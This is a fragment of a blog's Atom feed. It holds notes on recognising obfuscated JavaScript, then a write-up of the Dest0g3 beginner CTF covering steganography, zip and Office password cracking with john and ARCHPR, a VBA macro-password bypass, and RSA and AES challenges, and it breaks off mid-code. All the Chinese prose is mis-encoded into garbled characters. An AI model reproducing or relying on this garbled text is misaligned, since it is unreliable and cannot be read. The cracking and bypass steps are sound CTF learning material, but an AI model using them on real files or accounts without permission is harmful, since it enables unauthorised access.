    <content type="html"><![CDATA[<p>â€‹    </p><h3 id="obfuscator-ob"><a href="#obfuscator-ob" class="headerlink" title="obfuscator / ob"></a>obfuscator / ob</h3><p>æ··æ·†åï¼Œå˜é‡è·Ÿæ–¹æ³•åå·²ç»å®Œå…¨æ›¿æ¢ï¼Œç¬¬ä¸€è¡Œå¯ä»¥çœ‹åˆ°æ˜æ˜¾çš„ä¸€ä¸ªæ•°ç»„ã€‚</p><p>ç‰¹å¾ï¼šç§»ä½æ“ä½œï¼Œå‡½æ•°åå’Œå˜é‡åé€šå¸¸ä»¥ _0x æˆ–è€… 0x å¼€å¤´ï¼Œåæ¥ 1~6 ä½æ•°å­—æˆ–å­—æ¯ç»„åˆã€‚</p><p>è§£æ··æ·†ï¼š</p><p><a href="https://tool.yuanrenxue.cn/decode_obfuscator">https://tool.yuanrenxue.cn/decode_obfuscator</a></p><p>â€‹    </p><h3 id="packed"><a href="#packed" class="headerlink" title="packed"></a>packed</h3><p>ç‰¹å¾ï¼ševalåé¢çš„functionå‚æ•°ç±»ä¼¼packedç»„æˆï¼ˆä¹Ÿå¯èƒ½æ˜¯å…¶ä»–ç»„æˆï¼‰ã€‚</p><p>è§£æ··æ·†ï¼š</p><p><a href="https://lelinhtinh.github.io/de4js/">https://lelinhtinh.github.io/de4js/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;h3 id=&quot;obfuscator-ob&quot;&gt;&lt;a href=&quot;#obfuscator-ob&quot; class=&quot;headerlink&quot; title=&quot;obfuscator / ob&quot;&gt;&lt;/a&gt;obfuscator / ob&lt;/h3&gt;&lt;p&gt;æ··æ·†åï¼Œå˜é‡è·Ÿæ–¹æ³•</summary>
      
    
    
    
    <category term="reverse" scheme="https://lazzzaro.github.io/categories/reverse/"/>
    
    
    <category term="js" scheme="https://lazzzaro.github.io/tags/js/"/>
    
    <category term="æ··æ·†" scheme="https://lazzzaro.github.io/tags/%E6%B7%B7%E6%B7%86/"/>
    
  </entry>
  
  <entry>
    <title>Dest0g3 520è¿æ–°èµ›</title>
    <link href="https://lazzzaro.github.io/2022/05/26/match-Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2022/05/26/match-Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/</id>
    <published>2022-05-26T12:09:18.000Z</published>
    <updated>2022-05-28T14:17:41.878Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    </p><p>é¦–å±ŠDest0g3 520è¿æ–°èµ›æ›´åŠ æ³¨é‡CTFerçš„åŸºç¡€çŸ¥è¯†é¢æŒæ¡ç¨‹åº¦ï¼Œç”±æ˜“åˆ°éš¾ï¼Œé€‚åˆå„å­¦ä¹ é˜¶æ®µé€‰æ‰‹å‚åŠ ï¼Œçº¯èŒæ–°æ°´å‡†ã€‚</p><p>æ¯”èµ›æ—¶é—´ï¼š2022.5.20 10:00 - 5.27 10:00</p><p>é¢˜ç›®åˆ†ç±»ï¼šWebã€Pwnã€Miscã€Cryptoã€Reã€AIã€BlockChain</p><p>é¢˜ç›®éš¾åº¦ï¼šèŒæ–°</p><p>æ¯”èµ›ç±»å‹ï¼šä¸ªäººèµ›</p><p>æ¯”èµ›äº¤æµQQç¾¤ï¼š923945203</p><p>ä¸ªäººèµ›å¥–åŠ±ï¼šæ€»æ¦œå‰10åŠå„æ–¹å‘å‰ä¸‰å‡å¯è·å¾—ã€Šä»0åˆ°1ï¼šCTFeræˆé•¿ä¹‹è·¯ã€‹ä¸€æœ¬ + å®šåˆ¶Uç›˜ï¼ˆ32Gï¼‰ä¸€ä¸ª</p><p>Rank: 12</p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Welcome-to-fxxking"><a href="#Welcome-to-fxxking" class="headerlink" title="Welcome to fxxking"></a>Welcome to fxxking</h3><blockquote><p>å…³æ³¨å…¬ä¼—å·å¹¶å›å¤ï¼šGive me the fxxking flag</p></blockquote><p>å…¬ä¼—å· <code>Dest0g3 Team</code> å›å¤ï¼šGive me the fxxking flagï¼Œ</p><p>å¾—åˆ° <code>The fxxking flag is: Dest0g3&#123;W31c0m3_t0_DestCTF2022!&#125;</code></p><p>â€‹    </p><h3 id="Pngenius"><a href="#Pngenius" class="headerlink" title="Pngenius"></a>Pngenius</h3><p>foremoståˆ†è§£pngå›¾ç‰‡å¾—åˆ°zipå‹ç¼©åŒ…ï¼ŒzstegæŸ¥çœ‹pngå›¾ç‰‡çš„lsbé€šé“å¾—åˆ° <code>Password for zip:Weak_Pas5w0rd</code>ï¼›</p><p>ç”¨å¯†ç  <code>Weak_Pas5w0rd</code> è§£å‹zipå‹ç¼©åŒ…å¾—åˆ°flagï¼š<code>Dest0g3&#123;2908C1AA-B2C1-B8E6-89D1-21B97D778603&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="EasyEncode"><a href="#EasyEncode" class="headerlink" title="EasyEncode"></a>EasyEncode</h3><blockquote><p>Enjoy Decoding</p></blockquote><p>ç”¨ARCHPRçˆ†ç ´zipå‹ç¼©åŒ…å¯†ç å¾—åˆ° <code>100861</code>ï¼ŒæŒ‰ç…§ æ‘©æ–¯å¯†ç -16è¿›åˆ¶-Unicode-Base64 è§£ç å¾—åˆ° <code>Dest0g3&#123;Deoding_1s_e4sy_4_U&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="ä½ çŸ¥é“jså—"><a href="#ä½ çŸ¥é“jså—" class="headerlink" title="ä½ çŸ¥é“jså—"></a>ä½ çŸ¥é“jså—</h3><p>æ‰“å¼€flagæ–‡ä»¶å‘ç°æ˜¯wordæ–‡ä»¶/å‹ç¼©åŒ…ï¼Œåœ¨ <code>document.xml</code> ä¸­æ‰¾åˆ°Base64ç¼–ç çš„å­—ç¬¦ä¸²ï¼Œè§£ç å¾—åˆ°brainfuckï¼Œ<a href="https://www.splitbrain.org/services/ook">åœ¨çº¿è§£å¯†</a>å¾—åˆ°16è¿›åˆ¶å­—ç¬¦ä¸² <code>446573743067337B38366661636163392D306135642D343034372D623730322D3836636233376162373762327D</code>ï¼Œè½¬ä¸ºå­—ç¬¦å¾— <code>Dest0g3&#123;86facac9-0a5d-4047-b702-86cb37ab77b2&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="StrangeTraffic"><a href="#StrangeTraffic" class="headerlink" title="StrangeTraffic"></a>StrangeTraffic</h3><p>Wiresharkæ‰“å¼€å‘ç°æ˜¯Modbusæµé‡ï¼Œåœ¨æµ0å‘ç°åˆ†æ®µBase64å­—ç¬¦ä¸² <code>RGVzdDBnM3</code>ã€<code>szMUE1QkVB</code>ã€<code>Ni1GMjBELU</code>ã€<code>YxOEEtRThF</code>ã€<code>QS0yOUI0Rj</code>ã€<code>I1NzEwOEJ9</code>ï¼Œè¿æ¥è§£ç å¾— <code>Dest0g3&#123;31A5BEA6-F20D-F18A-E8EA-29B4F257108B&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="EasyWord"><a href="#EasyWord" class="headerlink" title="EasyWord"></a>EasyWord</h3><blockquote><p>Let the word tell u</p></blockquote><p>æ ¹æ® <code>hint.txt</code> å¾—çŸ¥ <code>password.docm</code> å¯†ç å…¨å°å†™å­—æ¯ï¼Œä¸”æ»¡è¶³ <code>??q?b?</code>ï¼Œç”¨johnçˆ†ç ´ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">office2john password.docm &gt; hash.txt</span><br><span class="line">john --mask=<span class="string">&#x27;?l?lq?lb?l&#x27;</span> hash.txt</span><br></pre></td></tr></table></figure><p>å¾—åˆ°å¯†ç  <code>ulqsbt</code>ï¼›</p><p>æ‰“å¼€å‘ç°å­˜åœ¨å®ï¼ŒæŸ¥çœ‹å®ä»£ç æœ‰å¯†ç ï¼Œå‚è€ƒ<a href="https://blog.csdn.net/qq_44768749/article/details/102673212">ç±»ä¼¼é¢˜ç›®</a>ä¸­ç ´è§£å®å¯†ç çš„æ–¹æ³•ï¼Œå°†wordæ–‡ä»¶ç”¨å‹ç¼©åŒ…æ–¹å¼æ‰“å¼€ï¼Œæ‰¾åˆ° <code>vbaProject.bin</code> æ–‡ä»¶ä»¥16è¿›åˆ¶æ–¹å¼æŸ¥çœ‹ï¼Œå°† <code>DBP</code> æ”¹ä¸º <code>DBX</code> å¹¶ä¿å­˜ï¼Œå†å°†ä¿®æ”¹åçš„æ–‡ä»¶æ›¿æ¢åˆ°å‹ç¼©åŒ…é‡Œï¼Œæ”¹å›wordæ–‡ä»¶æ ¼å¼ï¼Œé‡æ–°æ‰“å¼€å¯çœ‹åˆ°å®ä»£ç ã€‚</p><p>è¿›å…¥VBAç¼–è¾‘å™¨æŸ¥çœ‹Dialogå¯¹åº”å®ä»£ç ï¼š</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Private</span> <span class="keyword">Sub</span> CB_OK_Click()</span><br><span class="line"><span class="keyword">Dim</span> strpasw <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line"><span class="keyword">Dim</span> strdec <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line"><span class="keyword">Dim</span> strusrinput <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line"><span class="keyword">Dim</span> t <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line">t = ChrW(<span class="number">21152</span>) &amp; ChrW(<span class="number">27833</span>) &amp; ChrW(<span class="number">21543</span>) &amp; ChrW(<span class="number">65292</span>) &amp; ChrW(<span class="number">21516</span>) &amp; ChrW(<span class="number">23398</span>) &amp; ChrW(<span class="number">20204</span>) &amp; ChrW(<span class="number">65281</span>)</span><br><span class="line"></span><br><span class="line">strusrinput = Dialog.TextBox_Pasw</span><br><span class="line"><span class="keyword">Dim</span> sinput <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line">sinput = strusrinput</span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> (strusrinput &lt;&gt; <span class="string">&quot;&quot;</span>) <span class="keyword">Then</span></span><br><span class="line">  strusout = Encode(strusrinput, t)</span><br><span class="line">  <span class="keyword">If</span> (strusout = <span class="string">&quot;â”¤â„¡Ç’qï½˜~&quot;</span>) <span class="keyword">Then</span></span><br><span class="line">      strdec = Decode(Dialog.Label_ls.Caption, sinput)</span><br><span class="line">  <span class="keyword">Else</span></span><br><span class="line">     <span class="keyword">If</span> (strusout = <span class="string">&quot;ï½‹GJEï½‡ï½‘&quot;</span>) <span class="keyword">Then</span></span><br><span class="line">        strdec = Decode(Dialog.Label_ls1.Caption, sinput)</span><br><span class="line">     <span class="keyword">Else</span></span><br><span class="line">          <span class="keyword">If</span> (strusout = <span class="string">&quot;Ğ®ÎŸopz+&quot;</span>) <span class="keyword">Then</span></span><br><span class="line">             strdec = Decode(Dialog.Label_ls2.Caption, sinput)</span><br><span class="line">          <span class="keyword">Else</span></span><br><span class="line">                <span class="keyword">If</span> (strusout = <span class="string">&quot;ï½šÎšjrĞ¨Ï†Îµã‚&quot;</span>) <span class="keyword">Then</span></span><br><span class="line">                    strdec = Decode(Dialog.Label_ls4.Caption, sinput)</span><br><span class="line">                <span class="keyword">Else</span></span><br><span class="line">                    <span class="keyword">If</span> (strusout = <span class="string">&quot;Ã Ç–tï¼µï½—â”§ï½ˆÃ¨&quot;</span>) <span class="keyword">Then</span></span><br><span class="line">                          strdec = Decode(Dialog.Label_ls3.Caption, sinput)</span><br><span class="line">                    <span class="keyword">Else</span></span><br><span class="line">                          strdec = StrConv(t, vbFromUnicode)</span><br><span class="line">                    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">                <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">           <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">      <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">   <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">   Label_CLUE.Caption = strdec</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br></pre></td></tr></table></figure><p>æ— éœ€åˆ†æåŠ è§£å¯†ç®—æ³•ï¼Œè¾“å‡ºç»“æœ <code>strusout</code> ç”± <code>Encode(strusrinput, t)</code> åŠ å¯†å¾—åˆ°ï¼Œåªéœ€åˆ†åˆ«ç”¨è§£å¯†å‡½æ•°åæ¨äº”ä¸ªifåˆ†æ”¯æ¡ä»¶å¯¹åº”çš„æ˜æ–‡å³å¯ï¼Œä¿®æ”¹ <code>Label_CLUE.Caption = strdec</code> ä¸º <code>Label_CLUE.Caption = Decode(xxx,t)</code>ï¼Œå›åˆ°wordè¿è¡Œ <code>AutoOpen</code> å®ï¼Œéšä¾¿è¾“å…¥å­—ç¬¦ç‚¹å‡»ç¡®å®šå³å¯åœ¨Dialogçš„labelå¤„æ˜¾ç¤ºå¯¹åº”æ˜æ–‡ï¼Œåˆ†åˆ«æ˜¯ <code>123456</code>ã€<code>aaaaaa</code>ã€<code>000000</code>ã€<code>å¢™è§’æ•°æ</code>ã€<code>iloveyou</code>ï¼›</p><p>å°† <code>Label_CLUE.Caption = Decode(xxx,t)</code> æ”¹å› <code>Label_CLUE.Caption = strdec</code>ï¼Œåˆ†åˆ«è¾“å…¥äº”æ®µæ˜æ–‡ï¼Œå‘ç°è¾“å…¥ <code>å¢™è§’æ•°æ</code> å¾—åˆ° <code>è§£å‹å¯†ç ï¼šä¸¤åªé»„é¹‚é¸£ç¿ æŸ³,ä¸€è¡Œç™½é¹­ä¸Šé’å¤©!</code>ï¼Œç»“åˆwordé‡Œçš„hint <code>Rarå¯†ç ä¸ºå¤æ‚å‹ï¼Œé•¿åº¦ä¸º16ä½ï¼ŒåŒ…å«äº†å­—æ¯ã€æ•°å­—å’Œç¬¦å·ã€‚</code>ï¼Œå‹ç¼©åŒ…å¯†ç çŒœå‡ºä¸º <code>2zhlmcl,1hblsqt.</code>ï¼Œè§£å‹æ‹¿åˆ°flagï¼š<code>Dest0g3&#123;VBScr1pt_And_Hashc4t_1s_g00d&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="4096"><a href="#4096" class="headerlink" title="4096"></a>4096</h3><blockquote><p>Just relax and always be aware of the changes on the web!</p></blockquote><p>4096å°æ¸¸æˆï¼ŒæŸ¥çœ‹jsï¼Œç”¨chromeæºä»£ç é‡Œçš„æœç´¢åŠŸèƒ½ï¼Œæœ <code>flag</code> å¯åœ¨ <code>local_storage_manager.js</code> é‡Œæ‰¾åˆ°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getPartFlag</span>(<span class="params">score</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (score &gt; <span class="number">10000</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Q29uZ3JhdHVsYXRpb25zLCB0aGlzIGlzIHBhcnQgb2YgdGhlIGZsYWc6IE5HVmxOeTFpTmpjekxUazNNV1E0TVdZNFlqRTNOMzA9Lg==&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸¤æ¬¡base64è§£ç å¾—åˆ°flagååŠéƒ¨åˆ† <code>4ee7-b673-971d81f8b177&#125;</code>ã€‚</p><p>å‰åŠéƒ¨åˆ†åœ¨jså†…æ‰¾å¾ˆä¹…éƒ½æ²¡æ‰¾åˆ°ï¼Œè§‚å¯Ÿèµ„æºæ–‡ä»¶é‡Œå­˜åœ¨ <code>favicon.ico</code> å’Œ <code>favicon.png</code> ä¸¤å¼ å›¾ï¼Œå–å‡ºæ¥å‘ç°pngå›¾æœ‰éšå†™ï¼Œforemoståˆ†å‡ºä¸€ä¸ªwavæ–‡ä»¶å’Œä¸€ä¸ªzipæ–‡ä»¶ï¼›</p><p>ç”¨audacityæŸ¥çœ‹wavï¼Œå‰åä¸¤æ®µæ˜¯DTMFæŒ‰é”®éŸ³ï¼Œè§£ç å‡º <code>74958097831</code>ï¼Œä¸­é—´ä¸€æ®µæ˜¯SSTVæ…¢æ‰«æç”µè§†ï¼Œç”¨robot36æ‰«å‡ºå›¾ç‰‡ï¼Œå†…å®¹æ˜¯ <code>MD5&#123;cell phone number&#125;</code>ï¼Œå°†å‰é¢çš„ <code>74958097831</code> å€’åºæˆæ‰‹æœºå·æ ¼å¼ï¼ŒMD5åŠ å¯†å¾—åˆ° <code>32fc1b5487cb447f792a19418b92544e</code>ï¼Œè§£å‹zipå‹ç¼©åŒ…ï¼›</p><p>å‹ç¼©åŒ…é‡Œä¸ºåˆ‡å‰²åæ‰“ä¹±æ‹¼æ¥çš„å›¾ç‰‡ï¼Œåˆ©ç”¨gapså·¥å…·æ‹¼å›¾</p><p><code>gaps --image=puzzle.png --size=64 --save</code></p><p>å¾—åˆ°çš„ç»“æœè¿˜æ˜¯æœ‰éƒ¨åˆ†å—ä½ç½®ä¸å¯¹ï¼Œå†gapsä¸¤æ¬¡å¾—åˆ°å®Œæ•´åŸå›¾ï¼š</p><p><img src="/2022/05/26/match-Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/part_flag_solution_solution_solution.jpg" alt="part_flag_solution_solution_solution" style="zoom:50%;"></p><p>å°†å­—ç¬¦ä¸²æ‹¼æ¥å¾— <code>RGVzdDBnM3tlZDRkMTE0Zi05ZWU0LQ==</code>ï¼Œbase64è§£ç å¾—flagå‰åŠæ®µï¼š<code>Dest0g3&#123;ed4d114f-9ee4-</code>ã€‚</p><p>â€‹    </p><h3 id="Python-jail"><a href="#Python-jail" class="headerlink" title="Python_jail"></a>Python_jail</h3><blockquote><p>å¬è¯´pythonæ˜¯æœ€å¥½çš„è¯­è¨€ï¼Œé‚£æˆ‘æŠŠå®ƒé”èµ·æ¥ï¼Œæˆ‘å°±æ˜¯æœ€å¥½çš„è¯­è¨€äº†ï¼</p></blockquote><p>æ ¹æ®hintæç¤ºï¼Œpasswordé‡Œå†…å®¹æ˜¯whitespaceè¯­è¨€ï¼Œ<a href="https://ideone.com/NUNNbI">åœ¨çº¿ç¼–è¯‘</a>å¾—åˆ° <code>a8e15220-7404-4269-812e-6418557b7dc2</code>ï¼Œæ˜¯zipå‹ç¼©åŒ…å¯†ç ï¼›</p><p>è§£å‹zipå‹ç¼©åŒ…ï¼Œzstegå‘ç°lsbéšå†™pycæ–‡ä»¶ï¼Œæå–ï¼š</p><p><code>zsteg -E &quot;b1,rgb,lsb,xy&quot; SECRET1.png &gt; out.pyc</code></p><p>æ— éœ€åç¼–è¯‘ï¼Œ16è¿›åˆ¶æŸ¥çœ‹å‘ç° <code>ZmxhZ3tiNWJjZmM4Ny01Y2E2LTQzZjEtYjM4NC01N2QwOWI4ODZjYTl9</code>ï¼Œbase64è§£ç å¾— <code>flag&#123;b5bcfc87-5ca6-43f1-b384-57d09b886ca9&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="codegame"><a href="#codegame" class="headerlink" title="codegame"></a>codegame</h3><blockquote><p>Funny and ez codegame with Key to celebrate EDG</p></blockquote><p>KEYcodeé‡Œç»æŸ¥æ˜¯LOLCODE Languageï¼Œç”¨dcodeè§£å¾—åˆ°è¾“å‡ºæ˜¯ <code>QEFPFPQEBMXPPTLOA</code>ï¼Œä»¥æ­¤ä¸ºå¯†ç è§£å‹zipå‹ç¼©åŒ…ï¼Œå¾—åˆ°wordæ–‡ä»¶ï¼›</p><p>ç›´æ¥æ‰“å¼€wordå‘ç° <code>AES</code> æç¤ºï¼Œç”¨å‹ç¼©åŒ…æ‰“å¼€wordæœ‰ä¸ª <code>fllllllllll1ag.txt</code> æ–‡ä»¶ï¼Œé‡Œé¢æ˜¯ä¸€ä¸²emojiè¡¨æƒ…ï¼ŒçŒœæƒ³ä¸ºemoji-aesåŠ å¯†ï¼Œ<a href="https://aghorler.github.io/emoji-aes/">åœ¨çº¿è§£å¯†</a>ï¼ŒåŒæ ·ç”¨ <code>QEFPFPQEBMXPPTLOA</code> ä½œä¸ºkeyï¼Œæ²¡æˆåŠŸï¼Œå†ä¸æ–­ç›²è°ƒRotationï¼Œåœ¨Rotationä¸º4çš„æ—¶å€™è§£å¯†æˆåŠŸï¼Œå¾—åˆ°</p><p><code>666C61677B39663638663333342D303137612D343230312D393264662D6464646363313435333334647D</code></p><p>16è¿›åˆ¶è½¬å­—ç¬¦ä¸²å¾— <code>flag&#123;9f68f334-017a-4201-92df-dddcc145334d&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="rookie-hacker-2"><a href="#rookie-hacker-2" class="headerlink" title="rookie hacker-2"></a>rookie hacker-2</h3><blockquote><p>ï¼ˆå®¹å™¨1çš„å®¹å™¨åä¸º <code>test_docker1</code>ï¼Œå®¹å™¨2çš„å®¹å™¨åä¸º <code>test_docker2</code>ï¼‰</p><p>Aliceè®¿é—®è‡ªå·±çš„dockeræ—¶å¿˜è®°äº†æŠŠå®¹å™¨åˆ†åˆ«éƒ¨ç½²åœ¨å“ªäº›ipä¸Šï¼Œä½ èƒ½å¸®å¸®ä»–ä¹ˆï¼Ÿ Flagæ ¼å¼ï¼šDest0g3{ip1_ip2_â€¦..} ä¾‹ï¼šå‡è®¾å®¹å™¨1ã€å®¹å™¨2çš„ipä¸º1.1.1.1ã€2.2.2.2ï¼Œåˆ™flagä¸º Dest0g3{1.1.1.1_2.2.2.2}</p></blockquote><p>éé¢„æœŸï¼Œdockerçš„IPåœ°å€ä¼šä»¥ <code>&quot;IPAddress&quot;: &quot;172.x.x.x&quot;</code> çš„å½¢å¼è®°å½•åœ¨é…ç½®æ–‡ä»¶ä¸­ï¼Œç›´æ¥åœ¨E01æ–‡ä»¶é‡Œç”¨æ­£åˆ™è¡¨è¾¾å¼ <code>&quot;IPAddress&quot;:&quot;172</code> æœç´¢ï¼Œå–å‡ºç°é¢‘ç‡æœ€é«˜çš„ä¸¤ä¸ªIPå³å¯ï¼Œflagï¼š<code>Dest0g3&#123;172.18.0.2_172.18.0.3&#125;</code>ã€‚</p><p>â€‹    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = next_prime(p)</span><br><span class="line">n = p*q</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">27272410937497615429184017335437367466288981498585803398561456300019447702001403165885200936510173980380489828828523983388730026101865884520679872671569532101708469344562155718974222196684544003071765625134489632331414011555536130289106822732544904502428727133498239161324625698270381715640332111381465813621908465311076678337695819124178638737015840941223342176563458181918865641701282965455705790456658431641632470787689389714643528968037519265144919465402561959014798324908010947632834281698638848683632113623788303921939908168450492197671761167009855312820364427648296494571794298105543758141065915257674305081267</span></span><br><span class="line"><span class="string">14181751948841206148995320731138166924841307246014981115736748934451763670304308496261846056687977917728671991049712129745906089287169170294259856601300717330153987080212591008738712344004443623518040786009771108879196701679833782022875324499201475522241396314392429412747392203809125245393462952461525539673218721341853515099201642769577031724762640317081252046606564108211626446676911167979492329012381654087618979631924439276786566078856385835786995011067720124277812004808431347148593882791476391944410064371926611180496847010107167486521927340045188960373155894717498700488982910217850877130989318706580155251854</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>$p,q$ ç›¸è¿‘ï¼Œå¸¸è§„RSAï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = </span><br><span class="line">e = </span><br><span class="line">c = </span><br><span class="line">p = iroot(n,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> is_prime(p):</span><br><span class="line">    p += <span class="number">1</span></span><br><span class="line">q = n // p</span><br><span class="line">d = invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;Dest0g3&#123;96411aad-032c-20a8-bc43-b473f6f08536&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="babyAES"><a href="#babyAES" class="headerlink" title="babyAES"></a>babyAES</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line">my_aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">flag += (<span class="number">16</span> - <span class="built_in">len</span>(flag) % <span class="number">16</span>) * <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">c = my_aes.encrypt(flag)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(iv)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b&#x27;C4:\x86Q$\xb0\xd1\x1b\xa9L\x00\xad\xa3\xff\x96 hJ\x1b~\x1c\xd1y\x87A\xfe0\xe2\xfb\xc7\xb7\x7f^\xc8\x9aP\xdaX\xc6\xdf\x17l=K\x95\xd07&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xd1\xdf\x8f)\x08w\xde\xf9yX%\xca[\xcb\x18\x80&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xa4\xa6M\xab&#123;\xf6\x97\x94&gt;hK\x9bBe]F&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>AES-CBCè§£å¯†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">c = <span class="string">b&#x27;C4:\x86Q$\xb0\xd1\x1b\xa9L\x00\xad\xa3\xff\x96 hJ\x1b~\x1c\xd1y\x87A\xfe0\xe2\xfb\xc7\xb7\x7f^\xc8\x9aP\xdaX\xc6\xdf\x17l=K\x95\xd07&#x27;</span></span><br><span 